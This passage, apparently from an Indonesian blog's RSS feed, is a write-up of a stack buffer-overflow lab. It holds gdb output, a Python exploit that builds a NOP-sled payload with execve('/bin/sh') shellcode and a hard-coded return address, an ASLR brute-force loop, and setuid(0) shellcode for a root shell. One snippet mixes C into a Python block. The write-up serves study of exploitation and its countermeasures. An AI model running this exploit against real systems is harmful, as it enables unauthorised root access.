+   <span style="color:#ae81ff">0x080484da</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>:	lea    ecx,[esp<span style="color:#f92672">+</span><span style="color:#ae81ff">0x4</span>]
+   <span style="color:#ae81ff">0x080484de</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>:	<span style="color:#f92672">and</span>    esp,<span style="color:#ae81ff">0xfffffff0</span>
+   <span style="color:#ae81ff">0x080484e1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">7</span><span style="color:#f92672">&gt;</span>:	push   DWORD PTR [ecx<span style="color:#f92672">-</span><span style="color:#ae81ff">0x4</span>]
+   <span style="color:#ae81ff">0x080484e4</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">10</span><span style="color:#f92672">&gt;</span>:	push   ebp
+   <span style="color:#ae81ff">0x080484e5</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">11</span><span style="color:#f92672">&gt;</span>:	mov    ebp,esp
+   <span style="color:#ae81ff">0x080484e7</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">13</span><span style="color:#f92672">&gt;</span>:	push   ecx
+   <span style="color:#ae81ff">0x080484e8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">14</span><span style="color:#f92672">&gt;</span>:	sub    esp,<span style="color:#ae81ff">0x214</span>
+   <span style="color:#ae81ff">0x080484ee</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">20</span><span style="color:#f92672">&gt;</span>:	sub    esp,<span style="color:#ae81ff">0x8</span>
+   <span style="color:#ae81ff">0x080484f1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">23</span><span style="color:#f92672">&gt;</span>:	push   <span style="color:#ae81ff">0x80485d0</span>
+   <span style="color:#ae81ff">0x080484f6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">28</span><span style="color:#f92672">&gt;</span>:	push   <span style="color:#ae81ff">0x80485d2</span>
+   <span style="color:#ae81ff">0x080484fb</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">33</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x80483a0</span> <span style="color:#f92672">&lt;</span>fopen<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
+   <span style="color:#ae81ff">0x08048500</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">38</span><span style="color:#f92672">&gt;</span>:	add    esp,<span style="color:#ae81ff">0x10</span>
+   <span style="color:#ae81ff">0x08048503</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">41</span><span style="color:#f92672">&gt;</span>:	mov    DWORD PTR [ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">0xc</span>],eax
+   <span style="color:#ae81ff">0x08048506</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">44</span><span style="color:#f92672">&gt;</span>:	push   DWORD PTR [ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">0xc</span>]
+   <span style="color:#ae81ff">0x08048509</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">47</span><span style="color:#f92672">&gt;</span>:	push   <span style="color:#ae81ff">0x205</span>
+   <span style="color:#ae81ff">0x0804850e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">52</span><span style="color:#f92672">&gt;</span>:	push   <span style="color:#ae81ff">0x1</span>
+   <span style="color:#ae81ff">0x08048510</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">54</span><span style="color:#f92672">&gt;</span>:	lea    eax,[ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x211</span>]
+   <span style="color:#ae81ff">0x08048516</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">60</span><span style="color:#f92672">&gt;</span>:	push   eax
+   <span style="color:#ae81ff">0x08048517</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">61</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x8048360</span> <span style="color:#f92672">&lt;</span>fread<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
+   <span style="color:#ae81ff">0x0804851c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">66</span><span style="color:#f92672">&gt;</span>:	add    esp,<span style="color:#ae81ff">0x10</span>
+   <span style="color:#ae81ff">0x0804851f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">69</span><span style="color:#f92672">&gt;</span>:	sub    esp,<span style="color:#ae81ff">0xc</span>
+   <span style="color:#ae81ff">0x08048522</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">72</span><span style="color:#f92672">&gt;</span>:	lea    eax,[ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x211</span>]
+   <span style="color:#ae81ff">0x08048528</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">78</span><span style="color:#f92672">&gt;</span>:	push   eax
+   <span style="color:#ae81ff">0x08048529</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">79</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x80484bb</span> <span style="color:#f92672">&lt;</span>bof<span style="color:#f92672">&gt;</span>
+   <span style="color:#ae81ff">0x0804852e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">84</span><span style="color:#f92672">&gt;</span>:	add    esp,<span style="color:#ae81ff">0x10</span>
+   <span style="color:#ae81ff">0x08048531</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">87</span><span style="color:#f92672">&gt;</span>:	sub    esp,<span style="color:#ae81ff">0xc</span>
+   <span style="color:#ae81ff">0x08048534</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">90</span><span style="color:#f92672">&gt;</span>:	push   <span style="color:#ae81ff">0x80485da</span>
+   <span style="color:#ae81ff">0x08048539</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">95</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x8048380</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
+   <span style="color:#ae81ff">0x0804853e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">100</span><span style="color:#f92672">&gt;</span>:	add    esp,<span style="color:#ae81ff">0x10</span>
+   <span style="color:#ae81ff">0x08048541</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">103</span><span style="color:#f92672">&gt;</span>:	mov    eax,<span style="color:#ae81ff">0x1</span>
+   <span style="color:#ae81ff">0x08048546</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">108</span><span style="color:#f92672">&gt;</span>:	mov    ecx,DWORD PTR [ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x4</span>]
+   <span style="color:#ae81ff">0x08048549</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">111</span><span style="color:#f92672">&gt;</span>:	leave  
+   <span style="color:#ae81ff">0x0804854a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">112</span><span style="color:#f92672">&gt;</span>:	lea    esp,[ecx<span style="color:#f92672">-</span><span style="color:#ae81ff">0x4</span>]
+   <span style="color:#ae81ff">0x0804854d</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">115</span><span style="color:#f92672">&gt;</span>:	ret    
+End of assembler dump<span style="color:#f92672">.</span>
+</code></pre></div><p>kita break saat memamnggil function bof</p>
+<pre><code>gdb-peda$ b *main+79
+Breakpoint 1 at 0x8048529
+gdb-peda$ r
+</code></pre>
+<p>.*</p>
+<p>pada stack terlihat alamat str mulai mengisi nilai
+pada alamat tertentu yaitu</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ae81ff">0xbfffea37</span>
+</code></pre></div><p><!-- raw HTML omitted -->
+<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p>berarti kita dapat menaruh return address mulai dari alamat diatas sampai 517-len(shelccode) dikarenakan kita akan menaruh shelccode pada akhir badfile, jadi ketika kita alihkan ke alamat diantara alamat diatas sampai 517-len(shelccode) kita pada akhirnya akan menemui shellcode dan dapat mengeksekusi nya karena selain shellcode isi badfile hanyalah 0x90(NOP) yg artinya tidak ada  operasi apa-apa.</p>
+<p>kita buat saja return address nya</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ae81ff">0xbfffea77</span>
+</code></pre></div><h4 id="6-membuat-payload-dan-mengeksekusi">6. Membuat Payload dan mengeksekusi</h4>
+<p>payload =</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> sys
+
+shellcode<span style="color:#f92672">=</span> (
+    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0</span><span style="color:#e6db74">&#34;</span>             <span style="color:#75715e"># xorl    %eax,%eax              </span>
+    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x50</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e"># pushl   %eax                   </span>
+    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x68</span><span style="color:#e6db74">&#34;&#34;//sh&#34;</span>           <span style="color:#75715e"># pushl   $0x68732f2f            </span>
+    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x68</span><span style="color:#e6db74">&#34;&#34;/bin&#34;</span>           <span style="color:#75715e"># pushl   $0x6e69622f            </span>
+    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x89\xe3</span><span style="color:#e6db74">&#34;</span>             <span style="color:#75715e"># movl    %esp,%ebx              </span>
+    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x50</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e"># pushl   %eax                   </span>
+    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x53</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e"># pushl   %ebx                   </span>
+    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x89\xe1</span><span style="color:#e6db74">&#34;</span>             <span style="color:#75715e"># movl    %esp,%ecx              </span>
+    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x99</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e"># cdq                            </span>
+    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb0\x0b</span><span style="color:#e6db74">&#34;</span>             <span style="color:#75715e"># movb    $0x0b,%al              </span>
+    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xcd\x80</span><span style="color:#e6db74">&#34;</span>             <span style="color:#75715e"># int     $0x80                  </span>
+)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;latin-1&#39;</span>)
+
+
+offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">36</span>
+content <span style="color:#f92672">=</span> bytearray(<span style="color:#ae81ff">0x90</span> <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">517</span>))
+start <span style="color:#f92672">=</span> <span style="color:#ae81ff">517</span> <span style="color:#f92672">-</span> len(shellcode)
+returna <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x77\xea\xff\xbf</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;latin-1&#39;</span>)
+content[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;latin-1&#39;</span>)
+content[offset:offset<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> returna
+content[start:] <span style="color:#f92672">=</span> shellcode
+file <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;badfile&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>)
+file<span style="color:#f92672">.</span>write(content)
+file<span style="color:#f92672">.</span>close()
+</code></pre></div><p>pertama-tama seluruh content badfile akan diisi dengan NOP, lalu content pertama kita isi dengan 0x41 untuk mengetahui itu merupakan mulainya str,
+kemudian di offset return addres kita isi dengan return address diatas agar masuk ke addres str(badfile), pada akhir ( 517 - len(shellcode)) kita tulis kan shelccode nya</p>
+<p>lalu kita buat exploit nya dan menjalankan program stack nya</p>
+<pre><code>python3 exploit.py
+./StackGuard
+</code></pre>
+<p>jika berhasil akan mengarahkan kita ke shellcode</p>
+<p><!-- raw HTML omitted -->
+<!-- raw HTML omitted --></p>
+<p>Exploit berhasil kita lakukan</p>
+<hr>
+<h3 id="task-2-address-randomization">Task 2: Address Randomization</h3>
+<p>pada task 2, kita menyalakan sistem aslr dalam linux dengan command</p>
+<pre><code>  sudo sysctl -w kernel.randomize_va_space=2
+</code></pre>
+<p>lalu kita lakukan bruteforce sampai ketemu sesuai dengan alamat address nya,</p>
+<pre><code>  sh -c &quot;while [ 1 ]; do ./stack; done;&quot;
+</code></pre>
+<p>kita lakukan loop sampai program bisa tereksekusi.</p>
+<p>Bukti :</p>
+<p><img src="/img/task2.png" alt=""></p>
+<p>Proses while mencari addres yg sesuai (Faktor Lucky,bisa sangat lama, bisa cepat, tapi kebanyakan lama, saya sendiri beberapa jam baru ketemu) :</p>
+<p><img src="/img/prosestask2.png" alt=""></p>
+<p>Setelah mendapat shell (akhirnyaaaa) :
+<img src="/img/hasiltask2.png" alt=""></p>
+<hr>
+<h3 id="task-3-stack-guard">Task 3: Stack Guard</h3>
+<p>Pada task ini kita mencoba untuk tidak mematikan stack guard protection yang mana akan menghalangi kita untuk melakukan buffer overflow,</p>
+<p>Hasil :
+<img src="/img/task3.png" alt=""></p>
+<hr>
+<h3 id="task-4-non-executable-stack">Task 4: Non-executable Stack</h3>
+<p>pada task kali ini kita menjalankan program dengan tidak mengijinkan isi stack dapat dieksekusi</p>
+<pre><code>  gcc -o stack -z noexecstack -fno-stack-protector stack.c
+</code></pre>
+<p>perintah noexecstack membuat kita tidak bisa menjalankan shellcode yang ada di dalam Stack</p>
+<p>Hasil :</p>
+<p><img src="/img/task4.png" alt=""></p>
+<p>mendapatkan segmentation fault karena tidak bisa menjalankan payload dalam stack</p>
+<hr>
+<h3 id="task-5-defeating-dashs-countermeasure">Task 5: Defeating dash&rsquo;s countermeasure</h3>
+<p>Kita coba dulu program untuk mendapatkan shell</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objective-c" data-lang="objective-c"><span style="color:#75715e">// dash_shell_test.c
+</span><span style="color:#75715e"></span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+{
+<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[<span style="color:#ae81ff">2</span>];
+argv[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/bin/sh&#34;</span>;
+argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> NULL;
+<span style="color:#75715e">// setuid(0); ➀
+</span><span style="color:#75715e"></span>execve(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, argv, NULL);
+<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>**.</p>
+<p>Maka akan mendapat kan root :
+<img src="/img/t5.png" alt=""></p>
+<p>Tapi ketika kita setuid(0) kita aktifkan maka akan mendapat user seed:
+<img src="/img/t51.png" alt=""></p>
+<p>Nah kita perlu memodifikasi shellcode agar kita bisa mendapatkan akses root, pada file exploit.py kita tambahkan shellcode berikut pada line diatasnya</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">har shellcode[] <span style="color:#f92672">=</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">/*</span> Line <span style="color:#ae81ff">1</span>: xorl <span style="color:#f92672">%</span>eax,<span style="color:#f92672">%</span>eax <span style="color:#f92672">*/</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xdb</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">/*</span> Line <span style="color:#ae81ff">2</span>: xorl <span style="color:#f92672">%</span>ebx,<span style="color:#f92672">%</span>ebx <span style="color:#f92672">*/</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb0\xd5</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">/*</span> Line <span style="color:#ae81ff">3</span>: movb <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">0xd5</span>,<span style="color:#f92672">%</span>al <span style="color:#f92672">*/</span>
+<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xcd\x80</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">/*</span> Line <span style="color:#ae81ff">4</span>: int <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">0x80</span> <span style="color:#f92672">*/</span>
+</code></pre></div><p>akan mendapatkan root :
+<img src="/img/t52.png" alt=""></p>
+<p>jika program diatas dijalankan pada program yang ada countermeasure dash nya maka kita yang semestinya akan mendapat shell user akan mendapat shell root.</p>
+]]></content>
+        </item>
+        
+    </channel>
+</rss>
